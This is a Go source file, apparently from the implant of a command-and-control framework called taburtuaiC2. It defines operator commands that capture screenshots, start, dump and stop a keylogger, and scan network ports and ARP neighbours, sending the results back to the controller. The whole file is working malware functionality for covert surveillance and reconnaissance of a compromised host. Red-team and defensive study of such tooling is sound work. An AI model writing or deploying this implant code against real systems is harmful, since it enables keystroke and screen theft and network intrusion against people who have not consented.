package main

import (
	"encoding/base64"
	"fmt"
	"strings"
	"time"

	"github.com/mjopsec/taburtuaiC2/implant/recon"
	"github.com/mjopsec/taburtuaiC2/pkg/types"
)

func handleScreenshot(_ *types.Command, result *types.CommandResult) {
	pngBytes, err := recon.CaptureScreen()
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = fmt.Sprintf("PNG:%d:%s", len(pngBytes), encodeBase64(pngBytes))
}

func handleKeylogStart(cmd *types.Command, result *types.CommandResult) {
	if err := recon.StartKeylogger(); err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	dur := cmd.KeylogDuration
	if dur > 0 {
		go func() {
			time.Sleep(time.Duration(dur) * time.Second)
			recon.StopKeylogger()
		}()
		result.Output = fmt.Sprintf("[+] Keylogger started for %ds", dur)
	} else {
		result.Output = "[+] Keylogger started (run keylog_stop to stop)"
	}
}

func handleKeylogDump(_ *types.Command, result *types.CommandResult) {
	data := recon.DumpKeylog()
	if data == "" {
		result.Output = "(no keystrokes captured yet)"
		return
	}
	result.Output = data
}

func handleKeylogStop(_ *types.Command, result *types.CommandResult) {
	data := recon.DumpKeylog()
	recon.StopKeylogger()
	result.Output = fmt.Sprintf("[+] Keylogger stopped. Final buffer (%d chars):\n%s", len(data), data)
}

func handleKeylogClear(_ *types.Command, result *types.CommandResult) {
	recon.ClearKeylog()
	result.Output = "[+] Keylog buffer cleared"
}

func handleNetScan(cmd *types.Command, result *types.CommandResult) {
	if len(cmd.ScanTargets) == 0 {
		result.Error = "scan_targets required (CIDR or IP list)"
		result.ExitCode = 1
		return
	}
	timeout := time.Duration(cmd.ScanTimeout) * time.Millisecond
	if timeout <= 0 {
		timeout = 500 * time.Millisecond
	}
	results, err := recon.RunNetScan(recon.NetScanOpts{
		Targets:    cmd.ScanTargets,
		Ports:      cmd.ScanPorts,
		Timeout:    timeout,
		Workers:    cmd.ScanWorkers,
		GrabBanner: cmd.ScanGrabBanners,
	})
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	if len(results) == 0 {
		result.Output = "(no open ports found)"
		return
	}
	var sb strings.Builder
	for _, r := range results {
		if cmd.ScanGrabBanners && r.Banner != "" {
			fmt.Fprintf(&sb, "%s:%d\topen\t%dms\t%s\n", r.Host, r.Port, r.Latency.Milliseconds(), r.Banner)
		} else {
			fmt.Fprintf(&sb, "%s:%d\topen\t%dms\n", r.Host, r.Port, r.Latency.Milliseconds())
		}
	}
	result.Output = sb.String()
}

func handleARPScan(_ *types.Command, result *types.CommandResult) {
	out, err := recon.ARPScan()
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
		return
	}
	result.Output = out
}

func encodeBase64(b []byte) string {
	return base64.StdEncoding.EncodeToString(b)
}
